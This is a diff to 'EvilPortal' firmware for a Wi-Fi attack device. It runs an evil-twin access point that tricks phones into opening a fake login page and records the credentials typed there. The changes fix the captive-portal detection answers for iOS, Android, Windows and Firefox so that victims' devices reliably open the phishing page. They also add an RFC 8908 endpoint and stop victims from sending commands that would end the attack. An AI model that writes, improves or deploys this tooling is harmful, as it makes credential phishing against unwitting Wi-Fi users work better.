@@ -259,23 +259,25 @@ String EvilPortal::get_password() {
 void EvilPortal::setupServer() {
 
   // ── CAPTIVE PORTAL PROBES ──────────────────────────────────
-  auto redirect = [this]() {
-    _cpProbes++;
-    server.sendHeader("Location", "/portal.html", true);
-    server.send(302, "text/plain", "");
-  };
+  // Delegated to serveCaptiveProbe() rather than answered inline. These same
+  // paths are registered by setupManagementServer() at boot, and WebServer
+  // appends handlers while dispatch walks the list from the head - so whichever
+  // of the two registered first answers every request from then on, and
+  // stop() does not clear it. Answering inline here produced a 302 that could
+  // never run: the management AP's "Success" handler was already in front of
+  // it, so a victim's probe was told the network was online and the login page
+  // never opened. Deciding inside the shared handler makes the registration
+  // order irrelevant.
+  auto probe = [this](uint8_t k) { this->serveCaptiveProbe(k); };
 
-  server.on("/generate_204",        [redirect](){ redirect(); }); // Android
-  server.on("/hotspot-detect.html", [redirect](){ redirect(); }); // Apple
-  server.on("/library/test/success.html", [redirect](){ redirect(); }); // Apple
-  server.on("/ncsi.txt",            [redirect](){ redirect(); }); // Windows
-  // Firefox's probe. This used to answer the literal body "success", which is
-  // precisely how a client is told the network is already online - the opposite
-  // of what a captive portal wants. Redirected like every other probe.
-  server.on("/success.txt",         [redirect](){ redirect(); }); // Firefox
-  server.on("/connecttest.txt",     [redirect](){ redirect(); }); // Windows 10+
-  server.on("/canonical.html",      [redirect](){ redirect(); }); // Ubuntu/GNOME
-  server.on("/chat",                [redirect](){ redirect(); }); // Apple (iOS 17+)
+  server.on("/generate_204",        [probe](){ probe(PROBE_204); });        // Android
+  server.on("/hotspot-detect.html", [probe](){ probe(PROBE_APPLE); });      // Apple
+  server.on("/library/test/success.html", [probe](){ probe(PROBE_APPLE); });// Apple
+  server.on("/ncsi.txt",            [probe](){ probe(PROBE_MS_NCSI); });    // Windows
+  server.on("/success.txt",         [probe](){ probe(PROBE_TXT); });        // Firefox
+  server.on("/connecttest.txt",     [probe](){ probe(PROBE_MS_CONNECT); }); // Windows 10+
+  server.on("/canonical.html",      [probe](){ probe(PROBE_APPLE); });      // Ubuntu/GNOME
+  server.on("/chat",                [probe](){ probe(PROBE_APPLE); });      // Apple (iOS 17+)
 
   // ── LIVE CAPTURE VIEWER ───────────────────────────────────
   // Deliberately an unlinked, non-obvious path. This runs on the same AP the
@@ -288,9 +290,14 @@ void EvilPortal::setupServer() {
   });
 
   // ── REDIRECT ROOT → PORTAL ────────────────────────────────
+  // Absolute Location with a body: some clients follow only absolute URIs, and
+  // an empty-bodied redirect is what iOS discards. On the panel this handler is
+  // unreachable (management registers "/" first and serves the file directly),
+  // but the standalone evil portal path has no such handler in front of it.
   server.on("/", [this]() {
-    server.sendHeader("Location", "/portal.html", true);
-    server.send(302, "text/plain", "");
+    server.sendHeader("Location", "http://192.168.4.1/portal.html", true);
+    server.send(302, "text/html",
+      "<html><body><a href=\"http://192.168.4.1/portal.html\">Iniciar sesion</a></body></html>");
   });
 
   // ── SERVE portal.html FROM SPIFFS ─────────────────────────
@@ -405,11 +412,11 @@ void EvilPortal::setupServer() {
 
   // ── NOT FOUND → REDIRECT ──────────────────────────────────
   server.onNotFound([this]() {
-    // Counted as a probe too: a device may request a detection URL we have not
-    // registered, and that still proves it reached the badge.
-    _cpProbes++;
-    server.sendHeader("Location", "/portal.html", true);
-    server.send(302, "text/plain", "");
+    // Apple has used randomised probe URIs since iOS 8.4, so a probe can land
+    // here instead of on a known path - and it still proves the device reached
+    // us. Routed through the shared handler so it gets real content rather than
+    // the empty redirect that iOS discards.
+    this->serveCaptiveProbe(PROBE_NOTFOUND);
   });
 
   Serial.println("[EP] Web server routes registered");
@@ -811,6 +818,98 @@ void EvilPortal::flushCapturedCreds() {
   #ifdef HAS_SCREEN
     this->sendToDisplay("Data Hashed & Saved");
   #endif
+}
+
+// Live capture viewer. Served on the evil AP itself so captures can be read
+// while the attack is still running, which previously required ending the
+// attack and waiting for the management AP to come back.
+//
+// Is an evil portal the thing currently on the air? The captive-probe answer
+// has to invert between the two modes, so this predicate decides it.
+//
+// Covers both evil portal paths:
+//   - the panel's evil twin, which sets mgmt_job_kind
+//   - the original standalone evil portal, which runs with no management AP
+// and deliberately excludes the management AP itself, where management_active
+// is true and mgmt_job_kind is empty.
+bool EvilPortal::evilTwinActive() {
+  if (this->mgmt_job_kind == "eviltwin") return true;
+  return this->runServer && !this->management_active;
+}
+
+// Answer an OS connectivity probe.
+//
+// The two modes need OPPOSITE answers, and getting this backwards is invisible
+// from the outside - which is exactly what happened here. On the management AP
+// the operator's phone must conclude the network is healthy, or iOS opens a
+// restricted websheet and can drop the association, making the dashboard
+// unusable. During an evil twin the victim's device must conclude the opposite,
+// because "this network is fine" is precisely the verdict that stops it from
+// ever opening the login page.
+//
+// The evil twin was answering with the management AP's "Success" body: the
+// probe path was registered first by setupManagementServer() at boot, and the
+// evil portal's own 302 registration for the same path could never win. The AP
+// worked, DHCP worked, DNS worked, the probe arrived - and was told the network
+// was online. Deciding here, per request, removes the ordering dependency
+// entirely: whichever registration wins, the answer is right.
+void EvilPortal::serveCaptiveProbe(uint8_t kind) {
+  _cpProbes++;
+
+  if (this->evilTwinActive()) {
+    // Serve the login page itself, with 200, rather than redirecting to it.
+    //
+    // An empty-body 302 is NOT enough. ESP-IDF's own captive portal example
+    // states it outright: "iOS requires content in the response to detect a
+    // captive portal, simply redirecting is not sufficient." iOS compares the
+    // response BODY against Apple's expected "Success" document; a redirect
+    // carrying no body gives it nothing to compare, so it falls back to
+    // assuming the network is fine and never opens the sheet. That is the
+    // state this firmware was in: the probe arrived and was answered, and the
+    // answer was unusable.
+    //
+    // Returning the portal directly removes the ambiguity entirely - any body
+    // that is not Apple's "Success" document means captive - and it also makes
+    // the sheet show the login form immediately instead of after a redirect.
+    if (SPIFFS.exists("/portal.html")) {
+      mgmtServeFile("/portal.html", "text/html; charset=utf-8");
+      return;
+    }
+    // No portal file: fall back to a redirect, but with an ABSOLUTE Location
+    // and a non-empty body, since some clients follow only absolute URIs and
+    // iOS needs the body regardless.
+    server.sendHeader("Location", "http://192.168.4.1/portal.html", true);
+    server.send(302, "text/html",
+      "<html><body><a href=\"http://192.168.4.1/portal.html\">Iniciar sesion</a></body></html>");
+    return;
+  }
+
+  switch (kind) {
+    case PROBE_NOTFOUND:
+      // Only reached on the management AP, where an unknown path is simply not
+      // found. Registered through this function so the catch-all is mode-aware
+      // too: onNotFound is a single slot and last-write-wins, so after an evil
+      // twin ended the panel was left serving the attack's redirect.
+      server.send(404, "text/plain", "not found");
+      break;
+    case PROBE_204:
+      server.send(204);
+      break;
+    case PROBE_MS_CONNECT:
+      server.send(200, "text/plain", "Microsoft Connect Test");
+      break;
+    case PROBE_MS_NCSI:
+      server.send(200, "text/plain", "Microsoft NCSI");
+      break;
+    case PROBE_TXT:
+      server.send(200, "text/plain", "success");
+      break;
+    case PROBE_APPLE:
+    default:
+      server.send(200, "text/html",
+        "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
+      break;
+  }
 }
 
 // Live capture viewer. Served on the evil AP itself so captures can be read
@@ -1239,26 +1338,38 @@ void EvilPortal::setupManagementServer() {
   });
 
   // ── iOS / Android captive portal probes ────────────────────────────────
-  // For the MANAGEMENT AP we want iOS/Android to believe the network has
-  // internet so they stay connected. The user opens Safari manually to
-  // 192.168.4.1. If we return anything other than the exact "Success"
-  // response, iOS opens its restricted websheet and may disconnect.
+  // Both answers are produced by serveCaptiveProbe(), which inverts them when
+  // an evil twin is on the air. These paths are ALSO registered by
+  // setupServer(), and WebServer keeps the first registration for the lifetime
+  // of the process, so the mode cannot be decided here at registration time -
+  // see serveCaptiveProbe().
+  //
+  // On the management AP the answers must say "online": the operator opens
+  // 192.168.4.1 manually, and anything else makes iOS open a restricted
+  // websheet and possibly drop the association.
   server.on("/hotspot-detect.html", HTTP_GET, [this]() {
-    server.send(200, "text/html",
-      "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
+    this->serveCaptiveProbe(PROBE_APPLE);
   });
   server.on("/library/test/success.html", HTTP_GET, [this]() {
-    server.send(200, "text/html",
-      "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
+    this->serveCaptiveProbe(PROBE_APPLE);
   });
   server.on("/generate_204", HTTP_GET, [this]() {
-    server.send(204); // Android: 204 = internet ok
+    this->serveCaptiveProbe(PROBE_204);
   });
   server.on("/connecttest.txt", HTTP_GET, [this]() {
-    server.send(200, "text/plain", "Microsoft Connect Test");
+    this->serveCaptiveProbe(PROBE_MS_CONNECT);
   });
   server.on("/ncsi.txt", HTTP_GET, [this]() {
-    server.send(200, "text/plain", "Microsoft NCSI");
+    this->serveCaptiveProbe(PROBE_MS_NCSI);
+  });
+  server.on("/success.txt", HTTP_GET, [this]() {
+    this->serveCaptiveProbe(PROBE_TXT);
+  });
+  server.on("/canonical.html", HTTP_GET, [this]() {
+    this->serveCaptiveProbe(PROBE_APPLE);
+  });
+  server.on("/chat", HTTP_GET, [this]() {
+    this->serveCaptiveProbe(PROBE_APPLE);
   });
 
   // ── API: POST /api/cmd (whitelist only) ────────────────────
@@ -1287,6 +1398,25 @@ void EvilPortal::setupManagementServer() {
     String rest = "";
     int sp = cmd.indexOf(' ');
     if (sp > 0) { base = cmd.substring(0, sp); rest = cmd.substring(sp + 1); rest.trim(); }
+
+    // UNTRUSTED-CLIENT GATE. During an evil twin this handler is reachable by
+    // the victims: it was registered first, at boot, so it wins over the evil
+    // portal's own stricter /api/cmd registration, which can never run. Every
+    // special case below - reboot, help, the risky-command refusals - is
+    // evaluated BEFORE the management whitelist, so gating at the whitelist
+    // alone would still leave those reachable. In particular `reboot` is
+    // guarded only by a fixed confirm string that is not a secret, which would
+    // let anyone on the rogue AP end the attack.
+    //
+    // So the narrow list is enforced here, first, ahead of everything else.
+    if (this->evilTwinActive()) {
+      static const char* kEvilApiAllowed[] = { "list", "stopscan", "ssids", "clearlist" };
+      if (!mgmtBaseIn(kEvilApiAllowed,
+                      sizeof(kEvilApiAllowed) / sizeof(kEvilApiAllowed[0]), base)) {
+        mgmtSendErr("not_whitelisted", "command not permitted from evil portal AP");
+        return;
+      }
+    }
 
     if (base == "reboot") {
       // I: check confirm in JSON body too
@@ -1339,6 +1469,8 @@ void EvilPortal::setupManagementServer() {
       return;
     }
 
+    // Management whitelist. The evil-twin case was already rejected by the
+    // untrusted-client gate above, so only the operator reaches this.
     if (!mgmtBaseIn(kMgmtAllowed, sizeof(kMgmtAllowed) / sizeof(kMgmtAllowed[0]), base)) {
       mgmtSendErr("not_whitelisted", "base command not in management whitelist");
       return;
@@ -2965,12 +3097,34 @@ void EvilPortal::setupManagementServer() {
   });
 
   // No captive redirect, no /get route: unknown paths get a plain 404
+  // RFC 8908 Captive Portal API. enableDhcpCaptivePortal() advertises a URI in
+  // the lease (RFC 8910, DHCP option 114) and iOS 14+ queries it on reconnects,
+  // expecting application/captive+json. Without this endpoint it got HTML and
+  // silently ignored the hint, so the option was being advertised with nothing
+  // behind it. Mode-aware: the management AP must report that it is NOT
+  // captive, or the operator's own phone starts showing a login prompt for the
+  // control panel.
+  server.on("/.well-known/captive-portal", HTTP_GET, [this]() {
+    if (this->evilTwinActive()) {
+      server.send(200, "application/captive+json",
+        "{\"captive\":true,"
+        "\"user-portal-url\":\"http://192.168.4.1/portal.html\"}");
+    } else {
+      server.send(200, "application/captive+json", "{\"captive\":false}");
+    }
+  });
+
   // Same viewer on the management panel, so captures survive the attack and
   // can be reviewed once the panel is reachable again.
   server.on("/pwnterrey-creds", HTTP_GET, [this]() { this->serveCredsPage(); });
 
   server.onNotFound([this]() {
-    server.send(404, "text/plain", "not found");
+    // Mode-aware: 404 on the panel, portal content during an evil twin. This
+    // slot is last-write-wins, and setupServer() overwrites it when an attack
+    // starts while rearmManagementAP() does not restore it - so routing both
+    // registrations through one handler is what keeps the behaviour correct in
+    // both directions.
+    this->serveCaptiveProbe(PROBE_NOTFOUND);
   });
 
   Serial.println("[MGMT] Management routes registered");
